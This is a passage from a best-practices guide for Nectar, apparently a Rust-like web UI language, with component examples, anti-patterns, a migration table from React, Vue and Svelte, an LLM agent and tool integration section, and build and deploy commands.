            <div class="input-row">
                <input bind:value={input} placeholder="Type a message..." />
                <button on:click={self.on_send}>"Send"</button>
            </div>
        </div>
    }
}
```

### Responsive Layout with Breakpoints

```nectar
breakpoints {
    sm: 640,
    md: 768,
    lg: 1024,
    xl: 1280,
}

component Layout() {
    style {
        .container {
            max-width: fluid("100%", "1200px");
            padding: fluid("8px", "32px");
            margin: "0 auto";
        }
        .grid {
            display: "grid";
            grid-template-columns: fluid("1fr", "repeat(3, 1fr)");
            gap: fluid("8px", "24px");
        }
    }

    render {
        <div class="container">
            <div class="grid">
                <slot />
            </div>
        </div>
    }
}
```

### Theme Toggle (Light/Dark/Auto)

```nectar
theme AppTheme {
    light {
        --bg: "#ffffff",
        --text: "#1e293b",
        --primary: "#4f46e5",
        --surface: "#f8fafc",
    }
    dark {
        --bg: "#0f172a",
        --text: "#e2e8f0",
        --primary: "#818cf8",
        --surface: "#1e293b",
    }
    auto: true,  // respect prefers-color-scheme, ~200 bytes runtime
}

component ThemeToggle() {
    fn toggle(&self) {
        AppTheme::toggle();  // cycles light -> dark -> auto
    }

    render {
        <button on:click={self.toggle}>
            {match AppTheme::current() {
                "light" => "Switch to Dark",
                "dark" => "Switch to Auto",
                _ => "Switch to Light",
            }}
        </button>
    }
}
```

### Paginated List with Search

```nectar
component UserDirectory(users: Vec<User>) {
    let mut query: String = "";
    let mut current_page: i32 = 1;
    let per_page: i32 = 25;
    let index: SearchIndex = search::create_index(self.users, vec!["name", "email"]);

    fn on_search(&mut self, q: String) {
        self.query = q;
        self.current_page = 1;
    }

    fn filtered_users(&self) -> Vec<User> {
        if self.query.is_empty() {
            self.users
        } else {
            search::query(self.index, self.query)
        }
    }

    render {
        <div>
            <input
                type="text"
                placeholder="Search users..."
                bind:value={query}
                on:input={debounce(self.on_search, 300)}
            />
            <ul>
                {let page = pagination.paginate(self.filtered_users(), self.current_page, self.per_page);
                 for user in page.data {
                    <li>
                        <strong>{user.name}</strong>
                        <span>{user.email}</span>
                    </li>
                }}
            </ul>
            <div class="pagination">
                {let pages = pagination.page_numbers(self.current_page, page.total_pages);
                 for p in pages {
                    <button on:click={self.current_page = p}>{f"{p}"}</button>
                }}
            </div>
        </div>
    }
}
```

### File Upload with Progress

```nectar
upload AvatarUpload {
    accept: ["image/png", "image/jpeg"],
    max_size: "5MB",

    on_progress(percent: f64) {
        UploadStore::set_progress(percent);
    }

    on_complete(url: String) {
        UploadStore::set_avatar_url(url);
        toast.success("Avatar uploaded");
    }

    on_error(err: String) {
        toast.error(f"Upload failed: {err}");
    }
}

component AvatarUploader() {
    render {
        <div>
            <AvatarUpload />
            {if UploadStore::get_progress() > 0.0 {
                <div class="progress-bar">
                    <div style={f"width: {UploadStore::get_progress()}%"} />
                </div>
            }}
        </div>
    }
}
```

---

## 9. Anti-Patterns

### Do NOT use `let mut` when you need reactive DOM updates

```nectar
// WRONG: let mut does not auto-update DOM bindings
component Counter() {
    let mut count: i32 = 0;
    // If count is used in render, prefer signal
}

// RIGHT: signal auto-updates every DOM binding in O(1)
component Counter() {
    signal count: i32 = 0;
}
```

Use `let mut` only for internal state that does not appear in the `render` block.

### Do NOT manually manage the DOM

There is no `document.getElementById` or `querySelector` in Nectar. The signal-to-DOM binding system handles all updates. If you find yourself wanting to manually touch the DOM, you are fighting the language.

### Do NOT ignore `Result` and `Option`

The compiler marks these `must_use`. If you try to discard them, the code will not compile. Always handle errors explicitly:

```nectar
// WILL NOT COMPILE: unused Result
fetch("/api/data");

// CORRECT
match fetch("/api/data") {
    Ok(response) => process(response),
    Err(e) => toast.error(f"Request failed: {e}"),
}
```

### Do NOT use raw `fetch` without a contract for external APIs

Raw `fetch` gives you no compile-time safety against API changes. Always wrap external API calls in a `contract`:

```nectar
// BAD: if the API changes field names, you get a silent runtime bug
let user = fetch("/api/user/1").json();

// GOOD: compiler checks field access, runtime validates shape
contract UserAPI {
    url: "/api/user/:id",
    response { id: u32, name: String, email: String }
}
```

Use raw `fetch` only for internal or simple calls where a full contract is overkill.

### Do NOT embed third-party scripts without sandboxing

```nectar
// DANGEROUS: third-party script has full page access
embed Analytics {
    src: "https://cdn.example.com/analytics.js",
}

// SAFE: sandboxed iframe, loaded when idle, integrity-checked
embed Analytics {
    src: "https://cdn.example.com/analytics.js",
    sandbox: true,
    loading: "idle",
    integrity: "sha384-abc123...",
}
```

### Do NOT create Web Workers manually

Nectar provides `spawn` and `parallel` as language constructs that manage Web Workers for you:

```nectar
// WRONG: trying to manually create workers
// (there is no Worker API exposed to Nectar code)

// RIGHT: spawn offloads to a Web Worker automatically
spawn {
    let result = heavy_computation(data);
    // result is transferred back to the main thread
}

// RIGHT: parallel runs multiple tasks concurrently
let (a, b, c) = parallel {
    compute_a(),
    compute_b(),
    compute_c(),
};
```

### Do NOT use floating-point for money

```nectar
// WRONG: floating-point arithmetic loses precision
let total: f64 = 19.99 * 1.0825;  // 21.639175000000002

// RIGHT: BigDecimal is exact
let total = BigDecimal::new("19.99").mul(BigDecimal::new("1.0825"));
// Exactly 21.639175
```

---

## 10. Migration from React/Vue/Svelte

### Concept Mapping

| React/Vue/Svelte | Nectar | Notes |
|---|---|---|
| `useState` | `signal` / `let mut` | `signal` for reactive DOM, `let mut` for internal state |
| `useEffect` | `effect` (in stores) | Effects auto-track signal dependencies |
| `useMemo` | `computed` (in stores) | Cached, recomputes only when dependencies change |
| `useContext` / `provide/inject` | `store` | Global reactive state, no prop drilling |
| `useRef` | `let` (immutable binding) | No DOM refs needed -- signals handle updates |
| Redux / Zustand / Pinia | `store` | Built-in, no setup, signals + actions + computed + effects |
| React Router / Vue Router | `router` | Language-level construct with guards |
| React Query / SWR | `cache` | Built-in with stale-while-revalidate, deduplication |
| Formik / React Hook Form / VeeValidate | `form` | Language-level construct with declarative validation |
| Axios / ky / ofetch | `fetch` + `contract` | Built-in fetch keyword, contracts for type-safe APIs |
| styled-components / Tailwind | `style { }` blocks | Scoped CSS, no runtime, auto-extracted critical CSS |
| Framer Motion / @vueuse/motion | `spring` / `keyframes` / `stagger` | Language-level animation primitives |
| Socket.IO / ws | `channel` | Language-level WebSocket with typed messages |
| Next.js / Nuxt / SvelteKit | `nectar build --target ssg/ssr/hybrid` | Build targets, not frameworks |
| lodash | `collections::*`, `debounce`, `throttle` | Built-in, tree-shaken |
| date-fns / Day.js | `Instant`, `ZonedDateTime`, `Duration` | First-class time types |
| uuid | `crypto.random_uuid()` | Built-in, cryptographically secure |
| Fuse.js | `search::create_index` / `search::query` | Built-in fuzzy search |

### Key Mental Shifts

1. **No `import` statements for standard features.** Everything is auto-included. Just use it.
2. **No `useEffect` cleanup.** The compiler detects memory leaks from event listeners, intervals, and subscriptions.
3. **No `key` props on lists.** The signal system tracks list items by identity, not by keys.
4. **No `useCallback` / `useMemo` for performance.** There is no re-render problem. Signals update O(1) DOM nodes directly.
5. **No `node_modules`.** Dependencies are managed via `Nectar.toml` and downloaded as Nectar source packages.
6. **Ownership replaces garbage collection.** Values are freed deterministically when their owner goes out of scope. No GC pauses.
7. **The compiler catches more bugs.** Exhaustive pattern matching, borrow checking, must-use errors, and contract validation happen at compile time.

---

## 11. AI Integration Guide

### The `agent` Keyword

An `agent` is a specialized component that wraps LLM interaction. It has three unique capabilities that regular components do not:

1. **`prompt system`** -- defines the system prompt
2. **`tool`** -- defines functions the AI can call
3. **`ai::chat_stream`** -- streams responses token by token

### Basic Agent Structure

```nectar
agent CodeAssistant {
    prompt system = "You are an expert programmer. Help users write, debug, and explain code.";

    signal messages: [Message] = [];
    signal input: String = "";
    signal streaming: bool = false;

    tool search_docs(query: String) -> String {
        let results = await fetch(f"/api/docs/search?q={query}");
        return results.json().summary;
    }

    tool run_code(language: String, code: String) -> String {
        let result = await fetch("/api/sandbox/execute", {
            method: "POST",
            body: f"{{\"language\":\"{language}\",\"code\":\"{code}\"}}",
        });
        return result.json().output;
    }

    fn send(&mut self) {
        if self.input.is_empty() { return; }
        let msg = Message { role: "user", content: self.input };
        self.messages.push(msg);
        self.input = "";
        self.streaming = true;
        ai::chat_stream(self.messages, self.tools);
    }

    fn on_stream_token(&mut self, token: String) {
        let last = self.messages.len() - 1;
        if self.messages[last].role == "assistant" {
            self.messages[last].content = self.messages[last].content + token;
        } else {
            self.messages.push(Message { role: "assistant", content: token });
        }
    }

    fn on_stream_done(&mut self) {
        self.streaming = false;
    }

    render {
        <div class="chat">
            <div class="messages">
                {for msg in self.messages {
                    <div class={f"message {msg.role}"}>
                        <div class="content">{msg.content}</div>
                    </div>
                }}
                {if self.streaming {
                    <div class="typing-indicator">"..."</div>
                }}
            </div>
            <div class="input-area">
                <input
                    bind:value={input}
                    placeholder="Ask me anything..."
                    on:submit={self.send}
                />
            </div>
        </div>
    }
}
```

### Tool Definition Best Practices

Tools should be:

- **Focused:** One clear action per tool. Do not create a "do everything" tool.
- **Typed:** Parameters and return types are explicit. The LLM sees these types.
- **Error-handled:** Wrap tool bodies in `try`/`catch` so tool failures do not crash the agent.
- **Descriptive:** The tool name and parameter names serve as documentation for the LLM.

```nectar
// GOOD: focused, clear name, typed parameters
tool get_weather(city: String) -> String {
    let result = await fetch(f"/api/weather?city={city}");
    return result.json().forecast;
}

// BAD: too broad, unclear what it does
tool api_call(endpoint: String, data: String) -> String {
    let result = await fetch(endpoint, { method: "POST", body: data });
    return result.json();
}
```

### Streaming Response Handling

The `ai::chat_stream` function delivers tokens incrementally via the `on_stream_token` callback. Each token triggers a signal update, which updates the DOM in O(1). This means streaming responses render progressively without re-rendering the entire message list.

### Error Handling in AI Contexts

Always handle tool failures gracefully. A tool that throws an unhandled error will interrupt the AI's response:

```nectar
tool search_docs(query: String) -> String {
    try {
        let results = await fetch(f"/api/docs/search?q={query}");
        return results.json().summary;
    } catch err {
        return f"Search unavailable: {err}";
    }
}
```

---

## 12. Build and Deploy

### Build Targets

| Target | Command | Use when |
|---|---|---|
| **PWA** | `nectar build --target pwa` | Default web app, installable, offline-capable |
| **SSG** | `nectar build --target ssg` | Content sites, blogs, docs -- pre-renders all pages to static HTML |
| **SSR** | `nectar build --target ssr` | Dynamic content that needs server-side rendering per request |
| **Hybrid** | `nectar build --target hybrid` | Mix of SSG (static pages) and SSR (dynamic pages) |
| **TWA** | `nectar build --target twa` | Android Play Store distribution via Trusted Web Activity |
| **Capacitor** | `nectar build --target capacitor` | iOS and Android native wrapper with device API access |

### Dev Server

```bash
# Basic dev server with hot reload
nectar dev --src . --port 3000

# With feature flags enabled
nectar dev --src . --port 3000 --flags beta_feature,new_ui

# With public tunnel for sharing
nectar dev --src . --port 3000 --tunnel
```

### Environment Variables

Use `env()` to access environment variables. The compiler validates at build time that all referenced env vars are defined:

```nectar
let api_url = env("API_BASE_URL");       // validated at compile time
let key = env("STRIPE_PUBLISHABLE_KEY"); // error if not set during build
```

Set them during build:

```bash
API_BASE_URL=https://api.example.com nectar build app.nectar --emit-wasm
```

### Feature Flags

Use `flag()` for feature flags. The compiler eliminates dead branches at build time:

```nectar
if flag("beta_feature") {
    // This entire block is removed from the binary if the flag is off
    <BetaComponent />
} else {
    <StableComponent />
}
```

Enable flags at build or dev time:

```bash
nectar build app.nectar --emit-wasm --flags beta_feature
nectar dev --flags beta_feature,new_ui
```

### Production Build Checklist

1. **Compile with optimizations:** `nectar build app.nectar --emit-wasm -O2`
2. **Set all `env()` variables** for your deployment target
3. **Disable dev-only `flag()` values** -- the compiler strips the dead code
4. **Run `nectar audit`** if you use any `embed` blocks -- checks third-party script integrity
5. **Run `nectar lint`** -- catches style issues, unused variables, and security warnings
6. **Verify contracts** -- ensure your `contract` definitions match current API schemas

### Output Structure

A typical production build produces:

```
dist/
  app.wasm          # Your compiled application (all logic)
  nectar-runtime.js # Syscall shim (~2.8 KB gzip)
  index.html        # Entry point
  styles.css        # Extracted CSS (scoped styles + critical CSS)
  sw.js             # Service worker (if --target pwa)
  manifest.json     # PWA manifest (if --target pwa)
```

No source maps by default. Add `--source-map` to include them for debugging.

---

## Quick Reference Card

```
CONSTRUCT       USE FOR                         STATE MODEL
component       UI rendering                    let mut / signal
store           Shared state                    signal + action + computed + effect
contract        API safety                      compile-time + runtime + wire validation
page            SEO pages                       meta + render
form            User input                      field + validation + on_submit
channel         WebSocket                       typed messages + auto-reconnect
app             PWA                             manifest + offline + push
agent           AI/LLM                          prompt + tool + streaming
router          Navigation                      route + guard + fallback

KEYWORD         WHAT IT DOES
signal          Reactive state (O(1) DOM updates)
let mut         Mutable local state (manual updates)
spawn           Offload to Web Worker
parallel        Run concurrent tasks
virtual         Virtualize long lists
lazy            Code-split a component
chunk           Group components for code splitting
secret          Taint-tracked sensitive value
permissions     Restrict component capabilities
embed           Managed third-party script
```

---

*This document is the ground truth for Nectar best practices. When in doubt, follow it.*
